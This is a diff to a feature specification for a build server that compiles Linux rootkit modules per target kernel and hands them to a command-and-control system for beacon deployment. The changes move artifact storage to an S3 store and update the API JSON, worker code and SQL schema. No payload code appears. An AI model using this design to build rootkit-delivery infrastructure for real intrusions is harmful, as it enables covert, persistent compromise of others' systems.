@@ -7,7 +7,7 @@
 | Priority | v2 |
 | Status | Planned |
 | MVP Phase | v2 |
-| Depends on | F0015, F0200, F0201, F0202 |
+| Depends on | F0015, F0015.01-AMD, F0200, F0201, F0202 |
 
 ## Summary
 Dynamic build server for compiling rootkit payloads on-demand based on target specifications. Downloads appropriate kernel headers and dependencies for the target system, compiles rootkit in isolated Docker containers, and delivers compiled artifacts to Xero C2 for beacon deployment. Mitigates kernel version incompatibility issues for Linux rootkits.
@@ -17,7 +17,7 @@ Dynamic build server for compiling rootkit payloads on-demand based on target sp
 - Support for multiple Linux distributions and kernel versions
 - Kernel header download and caching
 - LKM and eBPF compilation support
-- Artifact storage and delivery
+- Artifact storage and delivery through the F0015.01-AMD S3-compatible artifact store
 - Build job queue and tracking
 - Build logs and error reporting
 
@@ -43,7 +43,7 @@ Dynamic build server for compiling rootkit payloads on-demand based on target sp
                                                           v
                                                  +--------+---------+
                                                  |  Artifact Store  |
-                                                 |  (S3/Local)      |
+                                                 |  (F0015.01 S3)   |
                                                  +--------+---------+
                                                           |
                                                           v
@@ -89,7 +89,8 @@ Dynamic build server for compiling rootkit payloads on-demand based on target sp
   "status": "completed",
   "progress": 100,
   "logs": "Build successful...",
-  "artifact_url": "https://storage.xero.com/artifacts/job_id.ko",
+  "artifact_id": "uuid",
+  "artifact_key": "c2/rootkit-builds/job_id/rootkit.ko",
   "completed_at": "2024-01-01T00:01:30Z"
 }
 `
@@ -270,8 +271,8 @@ class BuildWorker:
             remove=True
         )
 
-        # Return artifact path
-        return f'/artifacts/{job_data["job_id"]}.tar.gz'
+        # Return packaged bytes to C2 for managed artifact storage.
+        return self.read_output(f'/output/{job_data["job_id"]}.tar.gz')
 `
 
 ## API Endpoints
@@ -303,7 +304,8 @@ Response:
   "job_id": "uuid",
   "status": "completed",
   "progress": 100,
-  "artifact_url": "..."
+  "artifact_id": "uuid",
+  "artifact_available": true
 }
 `
 
@@ -327,7 +329,7 @@ CREATE TABLE rootkit_build_jobs (
     status VARCHAR(50) DEFAULT 'queued',
     progress INTEGER DEFAULT 0,
     logs TEXT,
-    artifact_url TEXT,
+    artifact_id UUID REFERENCES artifacts(id) ON DELETE SET NULL,
     error_message TEXT,
     created_at TIMESTAMP DEFAULT NOW(),
     started_at TIMESTAMP,
@@ -336,6 +338,7 @@ CREATE TABLE rootkit_build_jobs (
 
 CREATE INDEX idx_build_jobs_status ON rootkit_build_jobs(status);
 CREATE INDEX idx_build_jobs_target ON rootkit_build_jobs(target_os, target_kernel_version);
+CREATE INDEX idx_build_jobs_artifact ON rootkit_build_jobs(artifact_id);
 `
 
 ## Stages
